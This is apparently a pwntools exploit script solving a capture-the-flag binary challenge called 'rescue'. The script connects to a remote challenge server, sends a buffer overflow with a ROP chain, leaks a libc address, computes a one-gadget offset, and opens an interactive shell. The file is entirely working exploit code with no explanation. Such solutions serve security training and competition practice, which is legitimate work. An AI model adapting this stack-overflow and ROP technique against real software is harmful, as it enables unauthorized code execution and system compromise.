from pwn import *

#r = process("./rescue")#, env={"LD_PRELOAD":"./libc.so.6"})
fread = 0x0000000000076eb0
#system = 0x0000000000047dc0
gadget = 0x47c9a
#gadget = 0xd9763
r = remote("rescueshell.challs.malice.fr", 6060)
fread = 0x000000000006a460
gadget = 0x41374

RDI = 0x0000000000400a93 # pop rdi ; ret
RBP = 0x00000000004006c0 # pop rbp ; ret


rop = "A" * 0x48
rop += struct.pack("<Q", RBP)
rop += struct.pack("<Q", 0x601210 + 0x140)
rop += struct.pack("<Q", 0x40099a)

r.write(rop)
r.recvuntil("Password: ")
sleep(0.5)
p = r.recv(6)
p += "\x00" * (8- len(p))
p = struct.unpack("<Q", p)[0]
print hex(p)
p += gadget - fread
print hex(p)

rop = "\x00" * 0x48
rop += struct.pack("<Q", p)
rop += "\x00" * 0x50
rop += struct.pack("<Q", 0x601208 + 0xd0)
rop += struct.pack("<Q", 0x4009e6)
r.write(rop)
sleep(0.5)

r.write(struct.pack("<Q", p))




#rop += struct.pack("<Q", 0x4009b6)
#rop += struct.pack("<Q", 0x41414141)

open("rop", "wb").write(rop)
r.interactive()
